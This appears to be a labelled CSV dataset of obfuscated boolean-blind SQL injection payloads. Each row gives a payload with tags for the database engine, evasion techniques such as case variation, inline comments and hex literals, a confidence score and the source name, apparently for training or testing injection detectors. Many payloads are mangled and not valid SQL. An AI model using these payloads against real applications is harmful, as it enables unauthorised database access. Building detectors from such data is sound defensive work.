payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"6"" Where*(selECt (seLeCT (seLECt 0X232b)))=1x235f And . ( SELEcT (SeleCT (seLEcT (sELecT (seLecT (seLECt (SELecT 0x2))))))* ( iF ( ( `SEleCt * frOm ( $SELecT CoNCaT ( 0x7971706a71, ( ~SelecT ( elT ( (SELeCt 0B110110011105) lIKE 0XCD4,0o0x6 ! )/*?MuY8??*/ `) ) {,0B0x0b1011001101A067A31,0o0x78 ~) ) [s ) `, (seLect (seLeCT 0x7538DA9E1D597D9A)),?(seleCt 0b0X7538DCFb9a2C4dfA)=) )^ ) anD['w' LIke 'w'And""{zi"" NoT/LikE ""{ZiL"" Or 6x0 aND (seLECT 0xB7B) nOt lIKE 0XB7C or fALse.--",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1' ) / ) As;jxvV whEre-0O0X19c1 LIKe 8X19C1 or,ElT/ (! 7x1810 LikE 0x18E0B108,SleEp ( \(selECT (SELECT (sElecT[0o0x6X5))) . ) )* Or (seLEcT 0x0O112f) Not LIKe/**/ ;0b21101000101+OR:""6WB""+!not LIKE ""6wb"" OR=FAlse and&trUe aNd ""*""<>""*!""^ && "".aI!""="".AI!"".aND{TRuE Or 0x0;AND (SeLecT?(SeLEct (sELEcT (SElECt (SElEcT (SeLeCT (SelECt (sELEcT (sElEct (Select 318)))))))))) likE\(sELect (sELecT 0X0o12e)) "" &&( TRue Or (SeLECT 0X0) or (SeLect 0x0) aNd ' ' LIkE ' ' anD "" ""="" "" or FaLSE --",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,string_double_quote
"4b1"" ) ) As VIGS WHERE 6175=0B0B0b1110101100011001010011111000111000011100000001000001101000111111000011001010011110000111111100101110010100001011100000001010001001111 Or ( SelEct 0o2* ( iF ( ( SElEcT * FRom ( Select CoNcAt ( 0x7171706A71, ;( sELeCt ( ELT ( ""2Hh*"" NOT LIKE ""2hh*!"",(SelecT 1) ) ) ) ,0b0X717a767a73,0O0X78 ) ) s ) ,/**/8446744073709551610, 0x7538dcfb76105eda ) ) ) or 0 Or 0 --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0O1'> )& OR ELt(&( (seLect (SELECT!(selecT (SELECT 5873))))}= 0X16F1,SlEep< (< (SeLeCT 4B0b0x5) ) < )! > aND :0X0B1011aA not LIke (sEleCt (sEleCt (seleCT (seLecT 2533))))!or 0O0Xc01=(SeLeCt (SELECt 0X0x5xC16)) Or 0b0 ANd/**/'F' LIke 'F' Or FalSe#tqjM",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"0"" ) and 4X0X47A=/* Hx;*/ ( ~SeLECt couNt (+ * ) FrOm Rdb$FiEldS\as T1,rdb$TyPEs as/**/t5,rdb$cOlLAtiOnS.As T0X3,RDb$FuNctIons as t4 ) *or 0x8 OR{(selecT (SeLECt 9X7)){ aND 't'% noT lIke 'tu' aND}TrUe=; ?AnD 'cQQ'='CQq' Or (sELeCT (sELECT 0O0X3)) or falSE oR 'm '='m z' And 't'='T' anD (sELEct (sELect (sELECT (selECt 0X1)))) and (SElEct (SELECT (SELECT 1))) aNd TRUE oR faLse oR (SElECt 2) or '?w' NoT liKE '?W' and trUE && True --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"1""""WHERE 0b8x0X4063 = LIke /*3BP/(SElect 0B101)!>@S*/ 9xcAF/**/oR 0x0B961Fe LIKE ( /*^FH)QxM*/selECT CoUNT+ ( * ) *_FroM%All_uSErS t2,All_USErs t0X0b4X4O8o2,ALl_USers T0,ALL_uSerS T0o0b9X3o100,alL_usErS:T5 ) anD/*)FI@|!E*/ TRUe ""aND TRUe* or|`FAlse Or (SeLeCT~0B0x1) and%0O5 && 3X0X0O6=(SeleCt (SELect[(seleCt 7x9))) *oR FAlSE OR FAlse oR; faLSe oR FALse anD;""}At""=""}aT"" OR (SEleCT (sELECt (SELeCT (SeLeCt?(SElECT (sElecT 0x0o0)))))) And True OR '``. '='``. M' or FAlsE Or faLSe && 0X1|Or faLSE AND (SElEct (selECT 1)) And (SELECT 1) --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"8'+!~( [SeleCt]gThP(wHere (seleCt 0O61x9Ca3) = (sELECT 2x0O0B1C5X8f)/*Ebq=n <Q4tv R2t*/ Or SlEeP (+ 4X1} ) $ anD ""m"" like:""m"" && _""%,f"" nOt likE ""%,FJ"" Or('l' not like 'l' OR (seLECT 0X8b7) or falSE AnD 0x1 anD (sELecT (seLEct (sElECt (sELEcT (seLEcT (SELEcT 0X1)))))) or faLsE{oR='dw' not = 'dw'? &&? TruE OR 'Ow_u' LIkE 'ow_u-' and TRUe oR faLSe anD 1 OR FAlSe OR (SELECT (SELECT 0))#AKeKl3rc+{0",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_single_quote
"7' ) ) AS dTwH WhERe (sELect 0x35a1)=0o2o0b0b101102001130001;aND CHar (|/*{)Jcc%j+\/Od7- 7 c*/0B1101464 ) * OR ChAr ( (sElECt 0b0x4f) :) or cHAr !( 0X14 )? Or ChAR: ( 0x0x4A )< =reGexp_SubsTrInG ( rEPeaT ( Right ( cHar ( (SElect 0B1001111000510)^ ) ,(sElECt 0x0) ) ;,(SelEcT (SelECT (selECt 0X12C0b1102910111111C0b401)))/**/ ) >,NuLL ) anD 0o0x0b1A0o5 nOT like *(sELecT (sElEcT (SELECt (SElect (SELECT 422))))) ANd [ tRUE or_9 or FalSE ANd True OR fALsE ANd TRuE AND 0X1FC9 != 0X1fcA AND 'G}' not LIke 'G}J' oR fAlsE ANd truE AND True OR False# oR 0X2128 LikE 0O17633 And 6X1 or faLsE and trUE OR faLSe Or (seLEcT (seLeCT (sElecT (sELeCT (sELEcT (sElecT (SElecT (SeLeCt (SElect (SeleCT 0)))))))))) OR 'P`F*'='p`f*P' OR 0X0 --ndMb",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"9b0o0b0b1o1(whErE 0x2fb2 % LIke OR False OR False#2X0O0o5fB0O0O2: aNd 0O8o0o0X2x0O304E: lIke ( sELeCT=CouNt (+ *} ); FrOm sYSuSERs@AS SyS2,sYsUSerS As{SYS0O05,SysUSeRs aS{syS0O3,sYSuSErs@aS:Sys0B100,sYsuserS AS'syS3,SYsuseRs as}sYS5,sYsUserS AS sYS7 ?) oR FAlsE OR 'j' lIKe 'Jo' OR 0X0! oR/**/ (selECt (SEleCt (SeLEcT (SeLECT 8x0)))), OR FAlsE and (sElecT&(SElECT (sElecT (sELECT (selEct 0O6))))) aND truE OR False oR 0xbd2=(SElECT 0o0O5731) aNd TRUe oR FAlSe AND~ TRUe[oR:FaLSE AnD~truE && truE Or faLSe And 0x5 aNd TRuE or falSe --#vYf",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"3o1' iN BooLEAn mOde ) Or%slEeP/*v<:62ml.A(`Ld'*/ ( +0O0o0x0X6B0B0o2b0O144 ): <Or False or 'b9'='b6.'/*F*/oR (sELECt,(SElect (selEct (seLECt?(select (SELECT (SELECT 0)))))))| AND true OR False#W87b",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"3' ) }` ) +) aND 6x1Ffb likE / ( seLeCT CouNt (/*>(SELECt (SELECT 1))*/ * ) ' fRom SysIbm.sysTableS As T0B0O0o1o0x0B0O0o8O6,sySibM.SyStablEs as t2,SYsIBM.SySTAbLEs And (SELEct (SeLECt (SEleCT (SeleCt 0X1eBE)))) NoT LIKe 0x1Ebf or False OR (seLECT (sElEct 0X739)) NOt = 0B0B0O122524142431!aND TrUe&AND?(sElECt (SELEcT 1o0x1)) oR ' W'=' Wv';oR 5X0 oR false && TRue!||:FalsE AND (SElEct 0x1) Or ""DrfL""=""drflF"" Or FalSe OR 6282!=(SElecT 6282) OR False#aS&T0B0B1011 )[ --b16 XN3It^f0!<@",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0B1'|| ( SeLECt 'rYOM' wherE 0X0B10001101110 LIke 0x9X39e or+chAR ( (SelECt 0x208)( ) Or ChaR ( {(seLeCT 0X0B0b11010111000011110) ) <or chAr; ( 0x63 ) oR ChAR ( (sELEct (seLeCt (selECT 001))) ^) liKe reGexp_SubsTrIng ^( rePEAt ( rigHt ( ChaR ( (sELeCT (SELEcT 0X5a8)) ) ,(seLeCT (SeLEct (SELECT 0))) ) *,0x12a0o5f700/ ), ,NuLl ) AND TRUe Or/0X930=(sELeCT 0x931)!OR('v' NoT lIkE 'v' && TRUE && ""N(S""<>""N S!"" or (SElecT (selECt (SelecT (SELECT 4)))) oR ':u'=':u:' and tRUE or (sEleCT (Select (select (SELECT (SELECT 3))))) ANd TruE ANd truE --",boolean_blind,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"3 ) As SKbY wHERe (sElEct (SeleCT (SeLect (sELECT 0x5xAA8O11)))) lIkE ^ 0X6dd Or Elt/*!xA. &\)]@HNHI3S^Y */ ( <(SeleCt 6x0o3422)\= 6b0O0B0o0b6o0x0x49e74f4D50,sLEEP (.`6x0X5X4 %) ) ) . Or 0X0D1b nOt-LiKe{(SEleCt (seLEct (seleCt (selECt (selECT (seleCT (selEct (SELECT 7453)))))))) or.(sELEcT 0X8) and^TrUE or 0X0 or FAlsE\And '@^MM'='@^mm' ANd (seLECT%0x1)=oR ""^"" not lIke ""^"" Or'fAlse or FAlse oR (SELECT 0) aND (sElecT (SELEct 1)) && 'g' NOT LIKE 'gK' AND True --",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,string_single_quote
"0O0o2X0B0B1' ) wHeRE 0B7b0o90077* like ""(SeLeCT 0X9b11001011f) Or>(SEleCt}(seLecT (seLEct[(SElEct 0x624)))) LIkE <(/*;{. OR FALse:OR/**/fAlSe OR FalSe or (selECT (sElECt (sELect](sElEct (SELEcT (sElECt 0)))))) + or FaLSE oR FALSE ANd TRUE#)DneWK HH BWmD*/ sELEct CoUNT ([[* )# FrOM|AlL_UsERS t0X0X5,all_USeRs-T6b10,AlL_uSeRS T3,All_UserS t0o0o0B100,All_uSErS>T0o5) ) And$ '3 ' NOt LIkE '7 l'&and&TrUe? AnD ""}j""-NOT LikE ""}J8""%Or 'Gh'='Gh.')aNd TRuE --O PeH=",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"9B4B1"" wHeRE'5157 =; 0x0o26FC ANd 0b0B0x51Db03Af2e6A= ( selEct_coUNt (.`O* /**/) FROm DOmain.DOMaiNs as%T0b1,DOMAin.coLUMnS AS%t2,Domain.tablES As]t3 ?) Or (seLECt (SELEcT_(SELECt%(seLeCT (SElECT (sELecT (SElEct (SELEct (SElecT (SELECT 9273)))))))))) LiKE/t*/\y^y*/0x0X802 ^AND .TrUE && TrUE OR (SelEct (SELEcT (SelEct (Select (SElecT 0X0))))) aND ';*s' lIKe ';*S'""--",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"SelEct ( CasE when ( (sELEct (sElecT (SEleCt (sElEct 7676)))) = 9X4x175F "") tHeN 0b3xa74 eLSe 0/ ( SELECt (SelEcT (SeLeCt (SELECT 4))) ;) ;eND ) And 'LY=' like 'ly='| && 'HK{Ue' NOt LiKe 'HK{Ue^' && True --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"9"" OR ]|2B0B8o1X8x0O3fe= {( sElECT[cOunT ;( * ) { frOM/* or*'f'='FS' Or ""t"",NOT,likE ""T"">Or FAlSE aND (seleCT (select (seLEcT 0x1)))#(SelEct$(selEcT (SELeCt (SEleCT 0x6))))$ */all_uSers T8,AlL_USeRS t6,alL_usERs t4o11,aLL_UseRs T0O4,AlL_users T0o10[ )] "" or:~ ""$"" noT=""$"" !AnD :truE Or (select (sELeCT (SeleCT 0B0X1306)))=(SElecT 4x0a9F):-- Wt",boolean_blind,unknown,case_variation|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"4, ( seLEct ( CASe WHeN ( `(seLEct`(SelecT (sELEct (SeleCT 8640)))) Like ;(SEleCt (SELECT 8510)) ) THeN ( aSCII ( RegEXP_SUbStRINg ^( repEaT (_ RigHT ( chAR ( 0X25A8 ) ,(selECt 0) ) ,,(SElEcT 0X1DCd6560) ) ,nuLl ) ) ) ElSE 8640/ }( SElEct 0X0 FRoM inFoRmATIOn_sCHeMa.systeM_uSerS ) ) End )/*&+%t-Aq4&|Q*/{+FrOM inF Or MatIOn_SCheMA.SYsTEm_USers ) or (seLeCT (seLECT 0)) or '`y'!='`y' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"1'!WHeRE (seLect 0xD0b0b) LikE~ (seLeCt*5o0xD0b)/**/and 3824. like \bEnChMaRk_ ( (SeLeCt 0O0X4C4b40),Md5 &&6252=0X186c#( 0x0B0x0B0B101001011001101000001010100101101010111010101010110010111100110100111101000001000101010 ) ) anD ' '=' '[aNd tRUE AND{tRUE oR 0X0x0 or 'o!7'!='O!7'/**/ Or 0x0 --:;J",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1' .) ) aS lIzu WherE 1X1E2b=0o0b106001502110101 or cHAr [( &(seLeCT (sELEcT 0X8O23)) <) Or cHaR ( (selEct*0x0X0X0X0B0XaE) ) OR cHAr/* @lQ+*/ ( ;(seleCT (SeleCt;0o0x62))? ) oR ChAR_ ( (sElecT (SELeCt (seLEct=0X53))) ) lIke/ REGEXP_SubsTRing ( repEaT ( leFt ( cRYPt_kEy ""( char: ( (select (selEct (SELECT 61)))^ )? or char ( (SeLeCT.(SElEct (selECT (seLecT (SElEct 0x59))))){%) Or cHaR] ( \(SeLecT (SelecT~0x53)) )/**/@,NulL ) ,0O9 ) ,0O0b0x23dE9F7b8c468FE7803e6DA6 ) ,nULl ) , or 'u(V' liKE :'U(Vr' anD tRUe oR FalsE or '%mFk' = '%mfkl' or falSE ANd TRUe Or (SELECT 0) or fALSE Or 'F<'='f<i' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
"0x1X0B1"" +) ) ^as pxDp""wHErE 0X31E0o0O2=(SELECT 4575) And ElT, (/*dU3|9%n*/ (SeleCt 0b0X2012) LiKe 0O0x0X1c32,(sElecT (SELect;(SELECT (SELECT 9828)))):*) Or FAlSE or*False OR 0x0 OR>` FALse oR FALsE AND 'K;U' LIke 'k;U' and 1 oR fALSE oR (selECt (sEleCT 0)) AnD trUe or fAlsE AnD 1423 lIKE 0o2667 OR False OR False --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.8,rule,sqliv5_json,unknown
"1'+ ;( ?sEleCt/'KqNJ' whERE (SElEcT (sELect (sELEct=0X250b))) += (SELeCT (SELeCT (selECt (SeLeCt (SEleCt (SElECT 0x09e)))))) OR{ oR fALSe OR 'j' NoT = 'j'And""dl"" NOT LikE ""dl@"" or 0X17D NoT liKe and ';' lIKe ';' Or 0X3x0 AND "" C"" NoT lIkE "" CE"" Or falSe && True oR FaLsE AND (SELECT (SELECT (SELECT 1))) OR False#(sELeCt 0x96d) Or 0o0B101010801000 nOt liKE/**/ (SElecT (selEct 0XeA6)) anD true#eLt ( 0x0O32f5X0B1 =*0b0x86f0O11,sLEep ( 0x5$ ))= ) ,#T?}QU",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"4o2%' }) ""*)} ]% ) ANd (SELEcT (SELeCT (SELEct 4417)))] LIke, 4145_ &&/*f }*/ (sELecT (SElecT 0X3o0B1)) aND '_mE' NOT=likE '_mEn' And ""0O3p[~P""=""0X1P[~p"" && (SELEct (sElect (sEleCT (sElecT (sEleCt 3))))) or FAlSe And=3xfC1!=(SeLeCT 0XFC4)`OR/*c qRz*h/a*/""0""!=""0"" anD TruE OR FALSe And,TruE ANd '9=' LIKE '9=' OR (SeLEcT 0) oR 0 ANd TrUe aNd truE oR FalSe AnD '?'!='?G'#Q alEqTZinjG *:c",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"1%' ) ) Or\CHAr ( 111 ) ||cHAR; (/*curwp!*/ (SELEct|(selEcT 100)) ) || chaR{;( (SeLeCT+0X0o0X4F) ) ||ChaR (< (SELECt (sELecT 121)) ) ) LIKe ReGeXp_SubsTRIng ""(, REpeat ( rIGht ( chAr< ( (SElECt (SeLeCt (SELEcT 1443))) ) ?,0x0 ) ,0o8B3X0xeA5f206 ) ,NUll ) oR fAlsE aNd 1""AND (sELect (SELeCT (SELeCT 8115))) iN ((sElECt 8114),(SElEcT 8215),0x1Fb4) OR 'gN' lIKE 'gnT' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"1"" }) ""whEre 0O0B0X9A0b61 ;LIke (SELect (SElect 0o0x0x6a4)) Or)9X2230$ /*w*/LiKE [ ( SEleCt COunT (( * ) FROM domAIN.dOMains aS t6,dOMAIn.COLuMnS>as t2,domaIn.tableS as t0b0O3 ) OR FalsE+ and trUE&&""($"" NoT like ""($ OR$fALse ANd True OR 'S'='s)' anD TrUe &&!trUe[AnD$tRUe Or 0X219e=(selEcT (seLeCt (SEleCt (selEct (SELEct;(sELECt (SelEcT 0575))))))) Or faLsE#"" --Qd3N++-cS",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"7"" ) && (SElECt (seleCT 0O6x1)) &&` 0x51B lIKE (selECt (seLECT (sELEcT 0x51B)))/*y0o3?Ms|Y51dZQ}*C`*(SELECT 57)*/OR ""G` -"" NOt LiKE!""G` -"" oR '?J'='?jO'_oR fALse oR fALsE And TRuE anD?2b11 OR FalSe And TRUe AnD tRUe OR False AND True AND (SELECT 1)# ) ) or CHar ( @0o0x0x4B ), *Or ChAr] (* (SElEcT (Select (sELECT (sELECT (seLEct (sELecT (SeLEct 0x93))))))) ) OR cHAr ( (SElECt 0X0B0x0b0b0b0x5a90dbe855b25a0d10edcbdf9c5829f36fbb366032c9c4c66c5b6bce61ff1) ) or chAR ( (sELECT (selEct (SelecT 0X6d)))/*S*RW */ ) = REGeXp_SUBStRing ( RePEAT ( LEfT} ( CryPt_KEy ( cHAR$ ( }(SELEct](SeLecT (selEct (seleCt 0B0x0B10011)))) ) or`CHAr ( 0b101b0b0B0b1061011000110111101000001100701110110011010110110110011810101101 )>#+ Or /**/CHaR {( (SELEct 0x53) ) ,nulL ) ,(selEct (seLEcT (sElECt (SELecT (seleCt (SELEct (SELECT (SELECT (SELECT 0))))))))) ) `,0o9563306114? ) ,NulL ) && ( ( \ ( ""URqg""/ LikE ""uRqGHJ)zk'.&:Ui> Uvl",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"2O5O0O5'[whErE 0o0o28134 lIKe 5x0o0xCA0o0O5AND ( SELECT * fRom ~ ( SELEcT ($ sleEp ( 9X2x7 ) ) < ) gCrr ) AND TRUe AnD ""vL""=""Vl"" && ""O"" not LIKE$""O`"" or?fALSe Or/*&QF|Y*/FalSe aNd 'Y'='Y' aNd ' y' NOT LIKE ' Yt' OR:(sELEcT (SEleCT (seleCT 0x0))) oR FAlSE or (SelECT 6b11111111) NOT LikE (SelEcT (SELECT 0xff)) AND True#nJQu:A{(SELECT (SELECT 10))-BUP",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_single_quote
"0X0b2' wheRe<9x0xAeE!=@(selEcT/**+GgGL:n*/7x0B120x0Xaea) <Or ;ELT ( ^0B4xEB0o0x64F249b6 Like& 0B10X0o20F7,slEep ( 0X8X5 ) *) \ ANd 0X1 aNd trUE+ANd TRuE or.'b'='Be' anD trUE& and tRuE aNd\TRue or (select (SElecT (seleCT (SELEcT (SELecT (selEcT (sELEct (SElECt 0)))))))) AnD ""j""<>""j1"" OR 'R'!='R' OR (SELECT (SELECT 0))#r;aIRSmX$ap* WbV",boolean_blind,mysql,case_variation|inline_comment|hex_string,0.45,rule,sqliv5_json,string_single_quote
"SeLect ( ;caSE when /*EPipui3g*/(. 0O7O9X19a4 /LiKE 0o0b0O0x0O1Xa0X3C} ) ~tHEN:4xd74 elSE (SeLeCt$0b0xe3C)*^ ( SeLEct (seleCt 0xE1D) frOm INFORmATIOn_scHeMA.chAraCtEr_SeTs ) ]ENd ]) ]aNd _'c'='C' or 'D' not LIkE ;'D' && (SeLecT (SEleCt 0O110)) noT LIKE (SELEct 3X57) AnD ""DlkWl""=""DLKWL"" OR 'Er' nOt LIkE 'er' anD`TruE oR (sELEcT 0x0) && 0B0X1 AND TRUe OR FaLSe#(SGvW@ix* l",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"1' ) AS<SjMT/**/whEre 0B0b10000000000100011101010110111001111001101: LiKE -0b0b1110101110111101110010001110100000100100101%|| 0x20ED<>} |(; SeLEcT coUnt ( * `) ; FrOM+GENERaTe_SEries /**/( 0B0B0o1,0x56f9A0~ ) ) +AND 'b'='B' AND '=''='='' { OR 0B0X25a01c0b1000110101 nOt in (1284,(SELect 0B0B1000011010000010101110110100100101),(sElECT 1286))`|| 0%aND 0X1 AND 'T' NoT liKe 'tb'/**/aND ""hfF""`<> ""HfFs"" --",boolean_blind,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
"1 ) aS qOdq<WhERE 0B1x0B1011010010111010100007001210100111040005 likE, (seLECT 0B1001111010077)[ Or >(selECT (sEleCT 0X6O4161))+_= >(+ seleCT&COuNT ( * ) fROM DOMaIn.DOMaINS/As t4,domain.coLumNs AS T2,dOMAIn.TaBlEs AS?T8x9 {) :] or 'K@T'='k@TI'/*?dh`*/ *or +(Select (seLECt (sELecT (SeLECt 0x0)))):or`0o0b0x9 or, ""{tIK"" nOT*LIKE ""{tIk""%aND (select 0X0x0x0o1)/* 4MC)RKP:yL 5k*/OR&faLse: or }^falSE OR 0x0x0 aNd (selECT~(SELECT<(SeLeCt 0O0X1))) AND TRUE!Or FALSe oR faLsE OR FalsE'--",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"0B0O0O1'; )% aS bAgI WHEre 0O3x0b0B110106171161110111113010251 %= (selEcT (SeLecT 0X4B0O1))&, ( ;SeleCt ( caSE When< ( 3X14e0o0 LIkE 0B0B0x154B ) $THeN`regeXP_suBstRiNg `( REPEat )( riGHt (( cHAr ( 0o0o0o0b0X5x6o0B0X0O0O11222C0f5ccanD(SELECt (sELECT (SELEcT (sELecT (SelECt (SelEct (SELECT 1))))))) OR FAlSE OR '<O'='<OL' And TRUe or FalsE && ""]?S"" NOT lIke ""]?SL""@OR FaLSe#!) /*I*&Mr*/,(SeLecT (SELECT (SeLeCt 0x0o0))) ) ,(SeLecT 0X0X0B0O1DcD6100); )?\,Null ) 'elSe CHar #(`&0xA8 ) or chaR (\ 0o0b0O10b11110100011010004100 ) oR chAR ( 0X0X70 ) { OR CHaR (]((SelECT((SElect 0X0o112)) )/**/ End ) !FroM INF or MaTIon_ScHemA.sysTEM_useRS[ )& AnD TrUe aNd{'/'/ not liKe '/w'&oR (selECt 0x0) aND ""V""+ nOt LiKE ""Vk""<aNd\""K1"" nOt LikE ""k19""=aNd\tRUE Or,""N"" NOt LikE ""n"" oR (seleCT (sElECt (seLEcT (SElEct 0b0)))) ANd (select.(seLECt (seLECT 0x1))) Or (seLect (SeLEct (SeLecT (SeLecT 0x20CC)))) LiKE 0x20cD@aNd TRUe --Ev7 ""cwxW;T|MB~",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"6 ) %) $ AND _trUe And`TrUe And TRUE And; ""pL"" Not LIKE ""Pl!""_[ oR;~ faLse And tRue&Or ""6D~"" NOt =(""6d~"" or * (SeLECT](SelEcT.(Select (SelECT 0O0)))) and 'g'='G' AND TrUe\AnD tRUe or FalSe or< 0x23A0o3=(selECT (SElECT 0x23A4)) And True or (SELECT 0) OR False#. ) or 0O8X3b0o144O0X0b1C0X0o0O326 =|/**/ ( _seLecT!count ( +* )/*O)J!(SELECT 0x3)*/ $froM=sysiBm.syStablEs/*J:W.(sElEcT (SelECT (SEleCt (seLecT 0XA))))vMNdP6._.0X4q`r""*/As t8,SySibM.SySTABLES`aS T0,sysIbM.syStableS~As*T0b0O11 ) )or�lSe oR (seLecT 8X5) --u<M'h)\XHrlf",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"3' ) AS uLBr where 0X1C49 liKE (SeleCT 0X1C03) AnD (SELECT (SeLECt (SELECT 3737))) LIKE$ DBms_UTilIty.sQlID_TO_SQLhaSH @ ( +. ( *chr ( [0x330 ) Or cHR; ( (SeLECT?(SEleCT (SELECT 0x0O107))) ) ] or ChR ( (sElECt (sELEct&(SELeCt (SEleCT 0X70))))^ ) or &CHr ]( (SelECT (sElECt 196)) ) Or Chr ( (sELEct (SElEct 213)) ) OR (';seLect ( cAse WheN ! ( 0O0X0o1e0O4C liKE (SelecT (selEcT (sELEcT 0X1518))) ) THeN$(seleCt 0X1) Else 0X0=End ) FrOM dUAL* ) or cHR ( (sEleCt 0X71) )} || chr/*w[&X(IWP8ZDd V0O0-ms=Fp aND True oR falSE OR 0#/*/ ( 2B1101010} ) /||cHR^=( (seLect (sElECT 118)) ) ] oR Chr <( :0b0X0o0O0x4a ) || chr ( (SElECT\0xd8) ) ) ` ) oR FAlse or ' ' not LiKe ' ' AnD;TRUe oR FAlse And trUe And^ ""+"" Not lIkE ""+-"" or fAlse AnD(0x0 oR fALSe And TruE and truE or FalsE And TRUe Or 0X0 ANd trUE aNd (SELecT (seLeCt (SEleCT (SeLeCT 1)))) AnD (sELECT (SelEcT 0x1)),--$",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.51,rule,sqliv5_json,unknown
